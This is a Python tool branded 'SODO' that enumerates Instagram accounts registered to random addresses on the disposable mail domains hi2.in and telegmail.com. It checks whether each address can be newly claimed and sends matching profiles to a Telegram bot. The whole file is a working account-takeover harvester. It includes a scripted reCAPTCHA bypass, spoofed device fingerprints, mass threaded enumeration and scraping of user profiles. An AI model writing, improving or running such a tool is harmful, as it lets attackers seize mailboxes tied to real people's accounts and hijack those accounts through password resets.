# language: Python 3, file: hi2i.py
# *hot path: check_email (#4, fast) → hit only: bloks (#9, user info) → profile (#1→#2→#7)*
# auto-install: requests + cfonts on first run

import subprocess
import sys

def _ensure(pkgs):
    for pkg in pkgs:
        try:
            __import__(pkg if pkg != "cfonts" else "cfonts")
        except ImportError:
            print(f"[*] installing {pkg} ...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])

_ensure(["requests", "cfonts"])

import requests, time, sys, os, random, secrets, uuid, json, base64, re, string, urllib.parse
from threading import Thread, Lock
from queue import Queue, Empty
from cfonts import render

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

BLOKS_VERSION = "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"

_SITEKEY = "6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct"
_CO      = "aHR0cHM6Ly9oaTIuaW46NDQz"
_WEB_UA  = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

def build_session():
    s = requests.Session()
    s.mount("https://", requests.adapters.HTTPAdapter(
        pool_connections=1, pool_maxsize=1, max_retries=0
    ))
    return s

# ══════════════════════════════════════════════════════════════════════════════
#  RECAPTCHA SOLVER
# ══════════════════════════════════════════════════════════════════════════════

_ver_lock  = Lock()
_ver_cache = {"version": None, "ts": 0.0}
_tok_lock  = Lock()
_tok_cache = {"token": None, "ts": 0.0}

def _get_version() -> str:
    with _ver_lock:
        if _ver_cache["version"] and time.time() - _ver_cache["ts"] < 3600:
            return _ver_cache["version"]
    try:
        r = requests.get("https://www.google.com/recaptcha/api.js",
                         headers={"User-Agent": _WEB_UA}, timeout=8)
        m = re.search(r"/releases/([\w-]+)/", r.text)
        if m:
            with _ver_lock:
                _ver_cache["version"] = m.group(1)
                _ver_cache["ts"] = time.time()
            return m.group(1)
    except Exception:
        pass
    return "rAqPVhe2JMK6mSJKi8r_vw"

def _get_token() -> str | None:
    with _tok_lock:
        if _tok_cache["token"] and time.time() - _tok_cache["ts"] < 90:
            return _tok_cache["token"]
    version = _get_version()
    cb   = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    sess = requests.Session()
    sess.headers.update({"User-Agent": _WEB_UA, "Accept-Language": "en-US,en;q=0.9"})
    anchor_url = (
        f"https://www.google.com/recaptcha/api2/anchor"
        f"?ar=1&k={_SITEKEY}&co={_CO}&hl=en&v={version}&size=invisible&cb={cb}"
    )
    try:
        r1 = sess.get(anchor_url, timeout=8)
    except Exception:
        return None
    challenge = None
    for pat in (r'"rresp","([^"]+)"', r'id="recaptcha-token" value="([^"]+)"'):
        m = re.search(pat, r1.text)
        if m: challenge = m.group(1); break
    if not challenge:
        return None
    payload = (
        f"v={version}&reason=q&c={urllib.parse.quote(challenge)}"
        f"&k={_SITEKEY}&co={_CO}&hl=en&size=invisible"
        f"&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!GgA4oQEAABkEBQAAAA"
    )
    try:
        r2 = sess.post(
            f"https://www.google.com/recaptcha/api2/reload?k={_SITEKEY}",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": anchor_url},
            timeout=8,
        )
    except Exception:
        return None
    for pat in (r'"rresp","([^"]+)"', r'\["rresp","([^"]+)"'):
        m = re.search(pat, r2.text)
        if m:
            tok = m.group(1)
            with _tok_lock:
                _tok_cache["token"] = tok
                _tok_cache["ts"]    = time.time()
            return tok
    return None

def _invalidate_token():
    with _tok_lock:
        _tok_cache["token"] = None
        _tok_cache["ts"]    = 0.0

# ══════════════════════════════════════════════════════════════════════════════
#  HI2 AVAILABILITY CHECK
# ══════════════════════════════════════════════════════════════════════════════

def hi2_check(username: str, domain: str) -> str:
    token = _get_token()
    if not token:
        return "error"
    try:
        r = requests.post(
            "https://hi2.in/api/custom",
            data={"domain": domain, "prefix": username, "recaptcha": token},
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://hi2.in",
                "Referer": "https://hi2.in/",
                "User-Agent": _WEB_UA,
            },
            timeout=10,
        )
        if r.status_code == 429:
            _invalidate_token(); return "rate_limited"
        if r.status_code == 200:
            email_ret = r.json().get("email", "").lower()
            return "available" if email_ret == f"{username}@{domain}".lower() else "taken"
        if r.status_code == 400:
            try:
                err = r.json().get("error", "").lower()
                if "already taken" in err: return "taken"
                if "recaptcha" in err: _invalidate_token(); return "error"
            except Exception:
                pass
            return "taken"
        return "error"
    except Exception:
        return "error"

# ══════════════════════════════════════════════════════════════════════════════
#  INSTAGRAM — DEVICE HELPER
# ══════════════════════════════════════════════════════════════════════════════

def random_device():
    brand  = random.choice(["samsung","Google","Xiaomi","OnePlus","Nothing","Realme","Redmi"])
    model  = random.choice(["SM-G973F","Pixel 7","M2102J20SG","ONEPLUS A6003","A063"])
    dpi    = random.choice(["420","450","440"])
    res    = random.choice(["1080x2280","1080x2400","1440x3088"])
    av     = random.choice(["11","12","13","14"])
    iv     = random.choice([280,290,300,310,320,330,340])
    device = str(uuid.uuid4())
    family = str(uuid.uuid4())
    android= "android-" + secrets.token_hex(8)
    ua     = (f"Instagram {iv}.0.0.{random.randint(10,99)} "
              f"Android ({av}; {dpi}dpi; {res}; {brand}; {model}; en_US)")
    tz     = str(random.choice([60,330,480,570]))
    return device, family, android, ua, tz

# ══════════════════════════════════════════════════════════════════════════════
#  #4  check_email — FAST HIT DETECTION  (hot path, called on every email)
# ══════════════════════════════════════════════════════════════════════════════

def _check_email_fast(session, email: str) -> bool | None:
    """
    POST /api/v1/users/check_email/
    Returns: True  = email registered on IG (hit)
             False = email free (miss)
             None  = request failed (caller falls back to bloks)
    """
    device, _, android, ua, _ = random_device()
    try:
        r = session.post(
            "https://i.instagram.com/api/v1/users/check_email/",
            data={
                "email":     email,
                "device_id": device,
                "guid":      device,
            },
            headers={
                "User-Agent":    ua,
                "Content-Type":  "application/x-www-form-urlencoded; charset=UTF-8",
                "accept-language": "en-IN, en-US",
                "x-ig-app-id":   "567067343352427",
                "x-ig-device-id": device,
                "x-ig-android-id": android,
                "x-ig-app-locale": "en_IN",
            },
            timeout=6,
        )
        if r.status_code == 200:
            data = r.json()
            avail = data.get("available")
            if avail is True:  return False   # free on IG = not our hit
            if avail is False: return True    # registered on IG = hit
        return None   # unexpected status — fallback
    except Exception:
        return None

# ══════════════════════════════════════════════════════════════════════════════
#  #9  bloks search — called ONLY on hits, to extract username/user_id
# ══════════════════════════════════════════════════════════════════════════════

def _bloks_search(session, email: str) -> str | None:
    """Returns raw response text (contains embedded user info) or None."""
    device, family, android, ua, tz = random_device()
    payload = {
        'params': json.dumps({
            "client_input_params": {
                "aac": json.dumps({
                    "aac_init_timestamp": int(time.time()),
                    "aacjid": str(uuid.uuid4()),
                    "aaccs": secrets.token_urlsafe(32)
                }),
                "flash_call_permissions_status": {
                    "READ_PHONE_STATE":"PERMANENTLY_DENIED",
                    "READ_CALL_LOG":"DENIED",
                    "ANSWER_PHONE_CALLS":"DENIED"
                },
                "was_headers_prefill_available":0, "network_bssid":None, "sfdid":"",
                "fetched_email_token_list":{}, "search_query":email,
                "auth_secure_device_id":"", "ig_oauth_token":[], "cloud_trust_token":None,
                "was_headers_prefill_used":0, "sso_accounts_auth_data":[],
                "encrypted_msisdn":"", "device_network_info":None,
                "text_input_id":f"akyuf0:{random.randint(50,70)}",
                "zero_balance_state":None, "android_build_type":"release",
                "accounts_list":[], "is_oauth_without_permission":0,
                "ig_android_qe_device_id":device,
                "gms_incoming_call_retriever_eligibility":"client_not_supported",
                "search_screen_type":"email_or_username", "is_whatsapp_installed":1,
                "lois_settings":{"lois_token":""}, "ig_vetted_device_nonce":None,
                "headers_infra_flow_id":"", "fetched_email_list":[]
            },
            "server_params": {
                "event_request_id":str(uuid.uuid4()), "is_from_logged_out":0,
                "layered_homepage_experiment_group":None, "device_id":android,
                "login_surface":"login_home", "waterfall_id":str(uuid.uuid4()),
                "INTERNAL__latency_qpl_instance_id":random.uniform(6.3e13,6.5e13),
                "is_platform_login":0, "context_data":"", "login_entry_point":"logged_out",
                "INTERNAL__latency_qpl_marker_id":36707139, "family_device_id":family,
                "offline_experiment_group":"caa_iteration_v3_perf_ig_4",
                "access_flow_version":"pre_mt_behavior", "is_from_logged_in_switcher":0,
                "qe_device_id":device
            }
        }),
        'bk_client_context': json.dumps({"bloks_version":BLOKS_VERSION,"styles_id":"instagram"}),
        'bloks_versioning_id': BLOKS_VERSION
    }
    headers = {
        'User-Agent':ua, 'accept-language':'en-IN, en-US',
        'x-bloks-version-id':BLOKS_VERSION,
        'x-fb-friendly-name':'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-ig-android-id':android, 'x-ig-app-id':'567067343352427',
        'x-ig-app-locale':'en_IN', 'x-ig-device-id':device,
        'x-ig-family-device-id':family, 'x-ig-timezone-offset':tz,
        'x-mid':base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime':str(time.time()),
        'x-pigeon-session-id':f'UFS-{uuid.uuid4()}-0',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'
    }
    try:
        r = session.post(
            "https://i.instagram.com/api/v1/bloks/async_action/"
            "com.bloks.www.caa.ar.search.async/",
            data=payload, headers=headers, timeout=10
        )
        return r.text
    except Exception:
        return None

# ══════════════════════════════════════════════════════════════════════════════
#  ORCHESTRATED EMAIL CHECK
# ══════════════════════════════════════════════════════════════════════════════

def check_instagram_email(session, email: str):
    """
    Returns (is_on_ig: bool, bloks_text: str|None)
    Fast path  : check_email (#4) — O(1) per request, no parsing overhead
    On hit only: bloks search (#9) — extracts username/user_id from response
    Fallback   : if check_email fails, bloks used as both detector + extractor
    """
    fast = _check_email_fast(session, email)

    if fast is False:
        return (False, None)                 # miss confirmed fast, skip bloks entirely

    if fast is True:
        text = _bloks_search(session, email) # hit confirmed — get user info
        return (True, text)

    # fast returned None (request failed) — fall back to bloks for both detection and info
    text = _bloks_search(session, email)
    if text and email.lower() in text.lower():
        return (True, text)
    return (False, None)

# ══════════════════════════════════════════════════════════════════════════════
#  EXTRACT FROM BLOKS RESPONSE
# ══════════════════════════════════════════════════════════════════════════════

def extract_from_bloks(text):
    if not text:
        return None, None
    username = user_id = None
    m = re.search(r'"username"\s*:\s*"([^"]{1,40})"', text)
    if m: username = m.group(1)
    m = re.search(r'"pk"\s*:\s*"?(\d{5,20})"?', text)
    if m: user_id = m.group(1)
    return username, user_id

# ══════════════════════════════════════════════════════════════════════════════
#  PROFILE FETCH  — #1 (mobile) → #2 (web) → #7 (username)
# ══════════════════════════════════════════════════════════════════════════════

def fetch_profile(session, username, user_id=None):
    _, _, android, ua, _ = random_device()
    ig_headers_mobile = {
        'User-Agent':    ua,
        'x-ig-app-id':  '567067343352427',
        'x-ig-android-id': android,
        'accept-language': 'en-IN, en-US',
    }

    def _parse_user_mobile(u):
        return {
            'username' : u.get('username', username or 'N/A'),
            'full_name': u.get('full_name', 'N/A'),
            'bio'      : u.get('biography', 'N/A'),
            'followers': u.get('follower_count', 'N/A'),
            'following': u.get('following_count', 'N/A'),
            'private'  : u.get('is_private', False),
            'verified' : u.get('is_verified', False),
        }

    if user_id:
        # #1 — mobile API
        try:
            r = session.get(
                f"https://i.instagram.com/api/v1/users/{user_id}/info/",
                headers=ig_headers_mobile, timeout=8
            )
            u = r.json().get('user', {})
            if u: return _parse_user_mobile(u)
        except Exception:
            pass

        # #2 — web API (same path, different host)
        try:
            r = session.get(
                f"https://www.instagram.com/api/v1/users/{user_id}/info/",
                headers={
                    'User-Agent': _WEB_UA,
                    'x-ig-app-id': '936619743392459',
                    'Accept': 'application/json',
                },
                timeout=8
            )
            u = r.json().get('user', {})
            if u: return _parse_user_mobile(u)
        except Exception:
            pass

    if username:
        # #7 — web profile info by username
        try:
            r = session.get(
                f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}",
                headers={
                    'User-Agent': _WEB_UA,
                    'x-ig-app-id': '936619743392459',
                    'Accept': 'application/json',
                },
                timeout=8
            )
            u = r.json().get('data', {}).get('user', {})
            if u:
                return {
                    'username' : u.get('username', username),
                    'full_name': u.get('full_name', 'N/A'),
                    'bio'      : u.get('biography', 'N/A'),
                    'followers': u.get('edge_followed_by', {}).get('count', 'N/A'),
                    'following': u.get('edge_follow', {}).get('count', 'N/A'),
                    'private'  : u.get('is_private', False),
                    'verified' : u.get('is_verified', False),
                }
        except Exception:
            pass

    return None

# ══════════════════════════════════════════════════════════════════════════════
#  GLOBALS
# ══════════════════════════════════════════════════════════════════════════════

red    = "\033[1m\033[31m"; green  = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"; cyan   = "\033[1m\033[36m"
white  = "\033[1m\033[37m"; reset  = '\033[0m'

total     = 0
ig_hit    = 0
hi2_avail = 0
hi2_taken = 0

counter_lock = Lock()
file_lock    = Lock()
tg_queue     = Queue()

print("\033[1;94m--- SODO Starting, Please Wait... ---\033[0m\n")
time.sleep(1); clear()

logo = render('SODO', font='block', colors=['cyan','white'], align='left', space=True)

def header():
    print("\x1b[1;39m—" * 60); print(logo); print("\x1b[1;39m—" * 60); print('')

header()
print("𝐄𝐍𝐓𝐄𝐑 BOT 𝐓𝐎𝐊𝐄𝐍")
token   = input("➜ ").strip(); clear(); header()
print('ENTER CHAT ID')
chat_id = input("➜ ").strip(); clear()

# ══════════════════════════════════════════════════════════════════════════════
#  TELEGRAM SENDER THREAD
# ══════════════════════════════════════════════════════════════════════════════

def tg_sender():
    s = build_session()
    while True:
        try:
            mail, h, prof = tg_queue.get(timeout=5)
        except Empty:
            continue
        if prof:
            priv = "🔒 Yes" if prof['private'] else "🌐 No"
            vfy  = "✅ Yes" if prof['verified'] else "No"
            msg  = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ HI2 AVAILABLE HIT — SODO\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  𝐇𝐈𝐓𝐒       : {h}\n"
                f"  𝐄𝐌𝐀𝐈𝐋     : {mail}\n"
                f"  𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄  : @{prof['username']}\n"
                f"  𝐍𝐀𝐌𝐄      : {prof['full_name']}\n"
                f"  𝐁𝐈𝐎       : {prof['bio']}\n"
                f"  𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 : {prof['followers']}\n"
                f"  𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 : {prof['following']}\n"
                f"  𝐏𝐑𝐈𝐕𝐀𝐓𝐄  : {priv}\n"
                f"  𝐕𝐄𝐑𝐈𝐅𝐈𝐄𝐃 : {vfy}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"𝐇𝐈𝐓 𝐁𝐘 : @S0DOHU\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
        else:
            msg  = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ HI2 AVAILABLE HIT — SODO\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  𝐇𝐈𝐓𝐒   : {h}\n"
                f"  𝐄𝐌𝐀𝐈𝐋 : {mail}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"𝐇𝐈𝐓 𝐁𝐘 : @S0DOHU\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
        try:
            s.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                data={'chat_id':chat_id, 'text':msg, 'parse_mode':'Markdown'},
                timeout=10
            )
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════════════════
#  STATUS DISPLAY — 1 HZ
# ══════════════════════════════════════════════════════════════════════════════

def status_loop():
    while True:
        time.sleep(1)
        clear()
        print(f"""▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
𝐂𝐇𝐄𝐂𝐊𝐄𝐃           ➜ {yellow}{total}{reset}
𝐈𝐆 𝐇𝐈𝐓            ➜ {cyan}{ig_hit}{reset}
𝐇𝐈2 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄   ➜ {green}{hi2_avail}{reset}  <- sent to bot
𝐇𝐈2 𝐓𝐀𝐊𝐄𝐍        ➜ {red}{hi2_taken}{reset}
▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
𝐃𝐄𝐕 — @S0DOHU {reset}
▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱""")

# ══════════════════════════════════════════════════════════════════════════════
#  WORKER
# ══════════════════════════════════════════════════════════════════════════════

def genprefix():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6,7)))

def worker(domain):
    global total, ig_hit, hi2_avail, hi2_taken
    session = build_session()

    while True:
        prefix = genprefix()
        email  = f'{prefix}@{domain}'

        # step 1: fast check_email → hit only triggers bloks for user info
        is_on_ig, rtext = check_instagram_email(session, email)

        with counter_lock:
            total += 1
            if is_on_ig: ig_hit += 1

        if not is_on_ig:
            continue

        # step 2: hi2 availability check
        hi2_status = hi2_check(prefix, domain)

        if hi2_status != "available":
            with counter_lock:
                hi2_taken += 1
            continue

        # combo hit
        with counter_lock:
            hi2_avail += 1
            h = hi2_avail

        ig_username, user_id = extract_from_bloks(rtext)
        prof                 = fetch_profile(session, ig_username, user_id)

        with file_lock:
            with open('Available_Hits.txt', 'a', encoding='utf-8') as f:
                f.write(f"Email     : {email}\n")
                if prof:
                    f.write(f"Username  : @{prof['username']}\n")
                    f.write(f"Name      : {prof['full_name']}\n")
                    f.write(f"Bio       : {prof['bio']}\n")
                    f.write(f"Followers : {prof['followers']}\n")
                    f.write(f"Following : {prof['following']}\n")
                    f.write(f"Private   : {prof['private']}\n")
                    f.write(f"Verified  : {prof['verified']}\n")
                f.write("—" * 40 + "\n")

        tg_queue.put((email, h, prof))

# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    print(f"""
————————————————————
{green}[1]{white} 𝐇𝐈2
{green}[2]{white} 𝐓𝐄𝐋𝐄𝐆𝐌𝐀𝐈𝐋
————————————————————
""")
    choose  = input(f"{cyan}➤ your choice (1/2): {reset}").strip()
    domain  = 'telegmail.com' if choose == '2' else 'hi2.in'
    threads = int(sys.argv[1]) if len(sys.argv) > 1 else 100

    Thread(target=tg_sender,   daemon=True).start()
    Thread(target=status_loop, daemon=True).start()

    for _ in range(threads):
        Thread(target=worker, args=(domain,), daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{red}stopped. combo hits → Available_Hits.txt{reset}")
```
